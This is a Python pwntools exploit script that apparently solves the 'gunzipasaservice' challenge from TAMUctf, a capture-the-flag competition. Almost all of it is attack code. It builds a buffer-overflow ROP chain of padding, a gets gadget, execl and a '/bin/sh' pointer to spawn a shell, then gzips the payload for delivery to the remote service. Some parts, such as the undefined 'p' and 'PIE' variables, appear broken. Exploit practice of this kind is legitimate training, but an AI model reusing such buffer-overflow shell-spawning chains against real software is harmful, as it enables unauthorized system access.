from pwn import *
from io import StringIO
import gzip

BINARY = './gunzipasaservice'
LIBC = './libc.so.6'
HOST = 'challenges.tamuctf.com'
PORT = 4709

elf = ELF(BINARY)
#libc = ELF('./libc.so.6')

context.terminal = ['tmux', 'split-w']


def get_base_address(proc):
        return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
        script = ""
        for bp in breakpoints:
                script += "b *0x%x\n"%(PIE+bp)
        gdb.attach(process(BINARY), gdbscript=script)

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

if args.GDB:
    gdb.attach(p)

pop_esi_edi_edp = p32(0x8049479)
pop_ebx = p32(0x804901e)
execl = p32(elf.plt['execl'])
gets = p32(elf.plt['gets'])
data = p32(0x804c03d + 2)
bss = p32(0x804c044)
gets_fd = p32(0x80492c9)
pop_edi_ebp = p32(0x804947a)
bin_sh = p32(0x804a00e)

exploit = 'A'*1048
exploit += gets + pop_ebx + data
exploit += execl + pop_esi_edi_edp + bin_sh 
exploit += p32(0)

out = StringIO()
with gzip.open('aloha.txt.gz', 'wb') as f:
    f.write(exploit)

